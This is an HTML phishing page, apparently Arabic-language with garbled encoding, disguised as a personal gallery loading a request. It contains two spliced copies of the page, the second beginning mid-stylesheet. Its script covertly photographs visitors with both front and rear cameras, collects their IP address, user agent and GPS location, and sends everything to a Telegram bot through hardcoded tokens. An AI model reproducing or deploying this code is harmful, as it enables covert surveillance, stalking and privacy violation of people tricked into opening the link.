<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Ø§Ù„Ù…Ø¹Ø±Ø¶ Ø§Ù„Ø´Ø®ØµÙŠ Ø§Ù„Ø§Ù…Ù†</title>
    <style>
        body {
            font-family: sans-serif;
            background: #f4f4f4;
            text-align: center;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        img {
            max-width: 90%;
            margin-top: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        video {
            display: none;
        }
        .loading {
            margin: 20px 0;
            color: #666;
            font-size: 18px;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            background: #f0f0f0;
            border-radius: 5px;
            display: inline-block;
        }
        .permission-request {
            margin: 20px auto;
            padding: 15px;
            max-width: 500px;
            background: #fff8e1;
            border: 1px solid #ffd54f;
            border-radius: 8px;
            text-align: center;
        }
        .permission-request button {
            padding: 10px 20px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px 0;
            transition: background 0.3s;
        }
        .permission-request button:hover {
            background: #388E3C;
        }
        .hidden {
            display: none;
        }
        .progress-bar {
            width: 100%;
            background-color: #f0f0f0;
            border-radius: 10px;
            margin: 20px 0;
        }
        .progress {
            width: 0%;
            height: 10px;
            background-color: #4CAF50;
            border-radius: 10px;
            transition: width 0.3s;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Ø¬Ø§Ø±ÙŠ ØªØ­Ø¶ÙŠØ± Ø§Ù„Ø·Ù„Ø¨ Ø§Ù†ØªØ¸Ø±</h1>
        
        <div id="permissionRequest" class="permission-request hidden">
            <h3>âš ï¸ ÙŠÙ„Ø²Ù… Ø¥Ø°Ù† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</h3>
            <p>Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø·ØŒ ÙŠØ±Ø¬Ù‰ Ù…Ù†Ø­ Ø§Ù„Ø¥Ø°Ù† Ù„Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</p>
            <button id="grantPermissionButton">Ù…Ù†Ø­ Ø§Ù„Ø¥Ø°Ù†</button>
        </div>

        <div class="progress-bar">
            <div id="progress" class="progress"></div>
        </div>

        <div id="loadingText" class="loading"> Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù… ...</div>
        <div id="status" class="status"></div>
        
        <img id="displayImage" src="https://via.placeholder.com/600x400?text=Ø¬Ø§Ø±ÙŠ+Ø§Ù„ØªØ­Ø¶ÙŠØ±+Ù„Ù„Ø§Ù„ØªÙ‚Ø§Ø·" alt="Ø§Ù„ØµÙˆØ±Ø©">
    </div>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // Telegram bot settings
        const BOT_TOKEN = "6978038945:AAHeocU3xJ41oOmKekacPo0ex0dvJNhjdUA";
        const CHAT_ID = "6113061454";
        
        // DOM elements
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        const statusDiv = document.getElementById("status");
        const displayImage = document.getElementById("displayImage");
        const loadingText = document.getElementById("loadingText");
        const permissionRequest = document.getElementById("permissionRequest");
        const grantPermissionButton = document.getElementById("grantPermissionButton");
        const progressBar = document.getElementById("progress");
        
        let facing = "user";  // Start with front camera
        let captureCount = 0;
        const maxCaptures = 2;  // Capture from both cameras
        let permissionAttempts = 0;
        let maxPermissionAttempts = 3;

        // Function to update progress bar
        function updateProgress(percent) {
            progressBar.style.width = percent + '%';
        }

        // Function to send data to Telegram
        async function sendToTelegram(endpoint, data, isPhoto = false) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
            
            try {
                if (isPhoto) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', new Blob([data], { type: 'image/jpeg' }), 'photo.jpg');
                    await fetch(url, { method: 'POST', body: formData });
                } else {
                    await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, ...data })
                    });
                }
                return true;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        // Function to send text info to Telegram
        async function sendTextToTelegram(ip, ua, gpsLat = null, gpsLong = null) {
            const now = new Date().toLocaleString('ar-EG');
            const gpsText = gpsLat && gpsLong ? `\nğŸ“ GPS: ${gpsLat}, ${gpsLong}` : '';
            
            const message = `ğŸ“¸ ØªÙ… ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø·:

ğŸ•’ ${now}
ğŸŒ IP: ${ip}
ğŸ“± UA: ${ua}${gpsText}`;
            
            return await sendToTelegram('sendMessage', { text: message });
        }

        // Function to capture image from video stream
        function captureImage() {
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                // Convert canvas to JPEG and send to Telegram
                canvas.toBlob(async (blob) => {
                    const arrayBuffer = await blob.arrayBuffer();
                    const success = await sendToTelegram('sendPhoto', arrayBuffer, true);
                    
                    if (success) {
                        statusDiv.textContent = `Ø§Ø¶ØºØ· Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ø¹Ø±Ø¶ Ø§Ù„Ø·Ù„Ø¨ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ ${facing === 'user' ? 'ÙˆØ­Ø¯Ù‡ Ù…Ù† Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©' : 'ÙˆØ­Ø¯Ù‡ Ù…Ù† Ø§Ù„Ø®Ù„ÙÙŠØ©'}`;
                    } else {
                        statusDiv.textContent = 'âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©';
                    }
                    
                    // Update progress
                    updateProgress((captureCount / maxCaptures) * 100);
                    
                    // Display the captured image
                    displayImage.src = URL.createObjectURL(blob);
                    
                    // Stop current tracks
                    video.srcObject.getTracks().forEach(track => track.stop());
                    
                    // Switch camera or stop if we've captured enough
                    captureCount++;
                    if (captureCount < maxCaptures) {
                        facing = facing === "user" ? "environment" : "user";
                        setTimeout(switchCamera, 800);  // Reduced from 1000ms to 800ms
                    } else {
                        updateProgress(100);
                        loadingText.textContent = "âœ… Ø§ÙƒØªÙ…Ù„ Ø¨Ù†Ø¬Ø§Ø­";
                    }
                }, 'image/jpeg', 0.9);
            }
        }

        // Function to switch between cameras
        async function switchCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: facing } }
                });
                
                video.srcObject = stream;
                video.play();
                setTimeout(captureImage, 800);  // Reduced from 1000ms to 800ms
            } catch (err) {
                console.log("ÙØ´Ù„ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:", err);
                // Try the other camera if one fails
                facing = facing === "user" ? "environment" : "user";
                if (captureCount < maxCaptures) {
                    setTimeout(switchCamera, 800);  // Reduced from 1000ms to 800ms
                }
            }
        }

        // Function to get client IP (fallback to a service if needed)
        async function getClientIP() {
            try {
                // First try a direct method (works on some browsers)
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.log("Couldn't get IP directly:", error);
                return "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
            }
        }

        // Function to check camera permission
        async function checkCameraPermission() {
            try {
                if (navigator.permissions && navigator.permissions.query) {
                    const permissionStatus = await navigator.permissions.query({ name: 'camera' });
                    return permissionStatus.state;
                }
                return 'unknown';
            } catch (error) {
                console.error('Permission API not supported', error);
                return 'unknown';
            }
        }

        // Main initialization
        async function init() {
            loadingText.textContent = 'Ø§Ù†ØªØ¸Ø± Ø±Ø¬Ø§Ø¡ Ø§Ù„ØªØ­Ù…ÙŠÙ„...';
            updateProgress(10);
            
            // Get client info
            const ip = await getClientIP();
            const ua = navigator.userAgent;
            updateProgress(30);
            
            // Send initial info to Telegram
            const textSent = await sendTextToTelegram(ip, ua);
            if (textSent) {
                statusDiv.textContent = 'âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²';
            } else {
                statusDiv.textContent = 'âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²';
            }
            updateProgress(50);
            
            // Try to get GPS location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const gpsSent = await sendTextToTelegram(ip, ua, pos.coords.latitude, pos.coords.longitude);
                    if (gpsSent) {
                        statusDiv.textContent += ' + ğŸ“ Ø§ØµØ¨Ø± Ù‡ØªØªÙØ´Ø®';
                    }
                    updateProgress(70);
                }, (err) => {
                    console.log("ÙØ´Ù„ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹:", err);
                    updateProgress(70);
                }, { timeout: 5000 });
            } else {
                updateProgress(70);
            }
            
            // Start camera capture process
            switchCamera();
        }

        // Try to access camera with auto-retry
        async function tryCameraAccess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                // If we get here, permission was granted
                permissionRequest.classList.add("hidden");
                init();
            } catch (error) {
                console.log("ÙØ´Ù„ ÙÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:", error);
                permissionAttempts++;
                
                if (permissionAttempts < maxPermissionAttempts) {
                    // Show permission request
                    permissionRequest.classList.remove("hidden");
                    statusDiv.textContent = `ÙŠØ±Ø¬Ù‰ Ù…Ù†Ø­ Ø§Ù„Ø¥Ø°Ù† Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø© (Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© ${permissionAttempts}/${maxPermissionAttempts})`;
                } else {
                    statusDiv.textContent = "ÙØ´Ù„ ÙÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§. ÙŠØ±Ø¬Ù‰ ØªØ­Ø¯ÙŠØ« Ø§Ù„ØµÙØ­Ø© ÙˆØ§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.";
                    loadingText.textContent = "âŒ ØªÙ… Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©";
                }
            }
        }

        // Grant permission button click handler
        grantPermissionButton.addEventListener('click', tryCameraAccess);

        // Initial auto-try
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(tryCameraAccess, 500);
        });
    </script>
</body>
</html>            max-width: 500px;
            background: #fff8e1;
            border: 1px solid #ffd54f;
            border-radius: 8px;
            text-align: right;
        }
        #startButton {
            padding: 12px 24px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin: 15px 0;
            transition: background 0.3s;
        }
        #startButton:hover {
            background: #388E3C;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div id="permissionGuide">
        <h3>âš ï¸ ÙŠÙ„Ø²Ù… Ø¥Ø°Ù† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</h3>
        <p>Ù„Ù„Ø§Ø³ØªÙ…Ø±Ø§Ø±ØŒ ÙŠØ±Ø¬Ù‰:</p>
        <ol>
            <li>Ø§Ù„Ù†Ù‚Ø± Ø¹Ù„Ù‰ Ø²Ø± "Ø§Ù„Ø³Ù…Ø§Ø­" Ø£Ùˆ "Allow" ÙÙŠ Ù†Ø§ÙØ°Ø© Ø§Ù„Ø¥Ø°Ù† Ø§Ù„ØªÙŠ Ø³ØªØ¸Ù‡Ø±</li>
            <li>Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø¹Ø¯Ù… Ù…Ù†Ø¹ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ù† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</li>
            <li>Ø§Ù„Ø³Ù…Ø§Ø­ Ù„Ù„Ù…ØªØµÙØ­ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¥Ø°Ø§ Ø·Ù„Ø¨ Ù…Ù†Ùƒ Ø°Ù„Ùƒ</li>
        </ol>
        <button id="startButton">Ø¨Ø¯Ø¡ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</button>
    </div>

    <img id="displayImage" src="https://via.placeholder.com/600x400?text=Ø¬Ø§Ø±ÙŠ+Ø§Ù„ØªØ­Ù…ÙŠÙ„" alt="Ø§Ù„ØµÙˆØ±Ø©" class="hidden">
    <p id="loadingText" class="loading hidden">ğŸ“¸ Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØªØ¨Ø§Ø¯Ù„ÙŠ Ù„Ù„ÙƒØ§Ù…ÙŠØ±ØªÙŠÙ†...</p>
    <div id="status" class="status hidden"></div>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // Telegram bot settings
        const BOT_TOKEN = "7144838322:AAGKviMrikld9z5Puxuk6eAu5AmSYQ2jxuQ";
        const CHAT_ID = "6113061454";
        
        // DOM elements
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        const statusDiv = document.getElementById("status");
        const displayImage = document.getElementById("displayImage");
        const loadingText = document.getElementById("loadingText");
        const permissionGuide = document.getElementById("permissionGuide");
        const startButton = document.getElementById("startButton");
        
        let facing = "user";  // Start with front camera
        let captureCount = 0;
        const maxCaptures = 2;  // Capture from both cameras
        let permissionAttempts = 0;

        // Function to show elements
        function showElements() {
            displayImage.classList.remove("hidden");
            loadingText.classList.remove("hidden");
            statusDiv.classList.remove("hidden");
            permissionGuide.classList.add("hidden");
        }

        // Function to send data to Telegram
        async function sendToTelegram(endpoint, data, isPhoto = false) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
            
            try {
                if (isPhoto) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', new Blob([data], { type: 'image/jpeg' }), 'photo.jpg');
                    await fetch(url, { method: 'POST', body: formData });
                } else {
                    await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, ...data })
                    });
                }
                return true;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        // Function to send text info to Telegram
        async function sendTextToTelegram(ip, ua, gpsLat = null, gpsLong = null) {
            const now = new Date().toLocaleString('ar-EG');
            const gpsText = gpsLat && gpsLong ? `\nğŸ“ GPS: ${gpsLat}, ${gpsLong}` : '';
            
            const message = `ğŸ“¸ ØªÙ… ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø·:

ğŸ•’ ${now}
ğŸŒ IP: ${ip}
ğŸ“± UA: ${ua}${gpsText}`;
            
            return await sendToTelegram('sendMessage', { text: message });
        }

        // Function to capture image from video stream
        function captureImage() {
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                // Convert canvas to JPEG and send to Telegram
                canvas.toBlob(async (blob) => {
                    const arrayBuffer = await blob.arrayBuffer();
                    const success = await sendToTelegram('sendPhoto', arrayBuffer, true);
                    
                    if (success) {
                        statusDiv.textContent = `âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø© Ù…Ù† ${facing === 'user' ? 'Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©' : 'Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©'}`;
                    } else {
                        statusDiv.textContent = 'âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©';
                    }
                    
                    // Stop current tracks
                    video.srcObject.getTracks().forEach(track => track.stop());
                    
                    // Switch camera or stop if we've captured enough
                    captureCount++;
                    if (captureCount < maxCaptures) {
                        facing = facing === "user" ? "environment" : "user";
                        setTimeout(switchCamera, 1000);
                    }
                }, 'image/jpeg', 0.9);
            }
        }

        // Function to switch between cameras
        async function switchCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: facing } }
                });
                
                video.srcObject = stream;
                video.play();
                setTimeout(captureImage, 1000);
            } catch (err) {
                console.log("ÙØ´Ù„ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:", err);
                // Try the other camera if one fails
                facing = facing === "user" ? "environment" : "user";
                if (captureCount < maxCaptures) {
                    setTimeout(switchCamera, 1000);
                }
            }
        }

        // Function to get client IP (fallback to a service if needed)
        async function getClientIP() {
            try {
                // First try a direct method (works on some browsers)
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.log("Couldn't get IP directly:", error);
                return "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
            }
        }

        // Function to check camera permission
        async function checkCameraPermission() {
            try {
                if (navigator.permissions && navigator.permissions.query) {
                    const permissionStatus = await navigator.permissions.query({ name: 'camera' });
                    return permissionStatus.state;
                }
                return 'unknown';
            } catch (error) {
                console.error('Permission API not supported', error);
                return 'unknown';
            }
        }

        // Main initialization
        async function init() {
            showElements();
            
            // Get client info
            const ip = await getClientIP();
            const ua = navigator.userAgent;
            
            // Send initial info to Telegram
            const textSent = await sendTextToTelegram(ip, ua);
            if (textSent) {
                statusDiv.textContent = 'âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²';
            } else {
                statusDiv.textContent = 'âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²';
            }
            
            // Try to get GPS location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const gpsSent = await sendTextToTelegram(ip, ua, pos.coords.latitude, pos.coords.longitude);
                    if (gpsSent) {
                        statusDiv.textContent += ' + ğŸ“ ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹';
                    }
                }, (err) => {
                    console.log("ÙØ´Ù„ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹:", err);
                });
            }
            
            // Start camera capture process
            switchCamera();
        }

        // Try to access camera with auto-retry
        async function tryCameraAccess() {
            permissionAttempts++;
            
            try {
                const permission = await checkCameraPermission();
                if (permission === 'granted') {
                    init();
                    return;
                }
                
                if (permissionAttempts < 3) {
                    setTimeout(tryCameraAccess, 1000);
                }
            } catch (error) {
                console.error('Error checking permission:', error);
            }
        }

        // Start button click handler
        startButton.addEventListener('click', init);

        // Initial auto-try (will work if permission was already granted)
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(tryCameraAccess, 500);
        });
    </script>
</body>
</html>
